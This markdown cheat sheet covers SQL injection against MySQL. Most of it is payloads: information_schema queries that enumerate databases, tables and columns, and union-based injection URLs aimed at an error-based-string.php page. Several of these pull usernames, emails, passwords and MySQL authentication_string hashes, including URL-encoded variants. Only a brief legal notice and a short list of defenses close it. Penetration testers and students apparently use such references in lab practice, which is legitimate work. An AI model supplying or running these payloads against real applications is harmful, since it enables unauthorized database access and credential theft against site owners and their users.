# Using information_schema for SQL Injection

`information_schema` allows attackers to discover database organization without prior knowledge. Here's how attackers leverage it:

## Common MySQL Enumeration Commands

```bash
mysql -u root -p
```

### Show all databases

```sql
show databases;
```

### Switch to a database (e.g. mysql)

```sql
use mysql;
```

### List tables in the current database

```sql
show tables;
```

### Get all users (for root access databases)

```sql
select * from user;
select user, authentication_string from user;
```

## Switch to information_schema database

```sql
use information_schema;
```

## List all tables in information_schema

```sql
select * from TABLES;
```

---

## Get All Database Names

```sql
select TABLE_SCHEMA from information_schema.TABLES;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 0,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 1,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 2,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 3,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 4,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 5,1;
```

### Alternative: Get all database names at once

```sql
select group_concat(TABLE_SCHEMA) from information_schema.TABLES GROUP BY TABLE_SCHEMA;
```

---

## Get All Table Names

```sql
select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES;
```

```sql
select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql";
```

```sql
select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 0,1;
```

```sql
select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 1,1;
```

```sql
select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 0,1;
```

```sql
select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 30,1;
```

```sql
select TABLE_NAME from information_schema.COLUMNS where TABLE_SCHEMA="mysql" GROUP BY TABLE_NAME;
```

### Alternative: All tables as comma list

```sql
select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA="mysql";
```

---

## Get All Column Names

```sql
select TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA="mysql" AND TABLE_NAME="columns_priv";
```

```sql
select TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA="mysql" AND TABLE_NAME="user" LIMIT 1,1;
```

```sql
select TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA="mysql" AND TABLE_NAME="user" LIMIT 40,1;
```

### Alternative: All columns in one list

```sql
select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA="mysql" AND TABLE_NAME="user";
```

---

## Extract User Data

```sql
select User, authentication_string from mysql.user;
```

```sql
select User, authentication_string from mysql.user LIMIT 0,1;
```

```sql
select User from mysql.user LIMIT 1,1;
```

```sql
select group_concat(User) from mysql.user;
```

```sql
select group_concat(authentication_string) from mysql.user;
```

```sql
select group_concat(User), group_concat(authentication_string) from mysql.user;
```

---

## Example: SQL Injection Exploit with Union

```
http://192.168.1.20/webpen/sqli/error-based-string.php?id=-1' UNION ALL SELECT group_concat(User), group_concat(authentication_string), 3, 4, 5 FROM mysql.user--
```

---

## Enumerating Databases

**Attackers use these queries to list or enumerate the names of all databases:**

```sql
SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;
```

### Switch to a custom/app database (example: armour_db)

```sql
use armour_db;
```



# payloads-

# Error-Based SQL Injection Payloads

## Overview

These payloads are examples of error-based SQL injection designed to extract information from a MySQL database server.

---

## 1. Get All Database Names One-by-One Using Offsets

Enumerate database names by incrementing the LIMIT offset:

```sql
error-based-string.php?id=-1' union all select 1,table_schema,3,4,5,6,7 from information_schema.tables GROUP BY table_schema LIMIT 0,1 --+
```

```sql
error-based-string.php?id=-1' union all select 1,table_schema,3,4,5,6,7 from information_schema.tables GROUP BY table_schema LIMIT 1,1 --+
```

```sql
error-based-string.php?id=-1' union all select 1,table_schema,3,4,5,6,7 from information_schema.tables GROUP BY table_schema LIMIT 2,1 --+
```

---

## 2. Get Table Names From Current Database One-by-One

Extract table names from the currently selected database:

```sql
error-based-string.php?id=-1' union all select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=database() LIMIT 0,1 --+
```

```sql
error-based-string.php?id=-1' union all select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=database() LIMIT 1,1 --+
```

```sql
error-based-string.php?id=-1' union all select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=database() LIMIT 2,1 --+
```

---

## 3. Get Table Names From MySQL Database One-by-One

Target the system 'mysql' database specifically:

```sql
error-based-string.php?id=-1' union all select 1,table_name,3,4,5 from information_schema.tables where table_schema='mysql' LIMIT 0,1 --+
```

```sql
error-based-string.php?id=-1' union all select 1,table_name,3,4,5 from information_schema.tables where table_schema='mysql' LIMIT 1,1 --+
```

```sql
error-based-string.php?id=-1' union all select 1,table_name,3,4,5 from information_schema.tables where table_schema='mysql' LIMIT 2,1 --+
```

---

## 4. Get All Table Names From a Database at Once Using GROUP_CONCAT

Retrieve all table names in a single query:

```sql
error-based-string.php?id=-1' union all select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=database() LIMIT 0,1 --+
```

```sql
error-based-string.php?id=-1' union all select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema='DWAPP' LIMIT 0,1 --+
```

---

## 5. Get Column Names From a Specific Table

Extract column names from a target table:

```sql
error-based-string.php?id=-1' union all select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name='users' AND table_schema='armour_db' LIMIT 0,1 --+
```

```sql
error-based-string.php?id=-1' union all select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name='users' AND table_schema=database() LIMIT 0,1 --+
```

---

## 6. Get All Data From Columns at Once Using GROUP_CONCAT

Extract actual data from specific columns:

```sql
error-based-string.php?id=-1' union all select group_concat(name),group_concat(email),3,4,5,6,7 from users --+
```

```sql
error-based-string.php?id=-1' union all select group_concat(login),group_concat(password),3,4,5,6,7 from DWAPP.users --+
```

---

## 7. Specific Queries Targeting the MySQL Database User Info

Extract MySQL user credentials:

```sql
error-based-string.php?id=-1%27+union+all+select+user,2,3,4,5+from+mysql.user+LIMIT+0,1+%23;
```

```sql
error-based-string.php?id=-1%27+union+all+select+authentication_string,2,3,4,5+from+mysql.user+LIMIT+0,1+%23;
```

---

## Key Techniques Illustrated

These queries demonstrate a step-by-step approach to enumerate databases, tables, columns, and data by exploiting SQL injection vulnerabilities with:

- **UNION queries** to combine malicious SELECT statements
- **Error-based information retrieval** through database error messages
- **information_schema** to access database metadata
- **GROUP_CONCAT** to retrieve multiple rows in a single response
- **LIMIT offsets** to paginate through results one at a time

---

## ⚠️ Important Legal Notice

**These payloads are for educational and authorized security testing purposes only.**

- Only use on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal under laws such as the Computer Fraud and Abuse Act (CFAA) in the US and similar legislation worldwide
- Ethical hackers and penetration testers must always operate within legal boundaries and professional ethics guidelines

---

## Defensive Measures

To protect against SQL injection attacks:

1. Use **parameterized queries** (prepared statements)
2. Implement **input validation** and sanitization
3. Apply **least privilege** principles to database accounts
4. Enable **Web Application Firewalls (WAF)**
5. Conduct regular **security audits** and penetration testing
6. Keep systems and frameworks **updated**

---

_Document created for cybersecurity education and authorized penetration testing._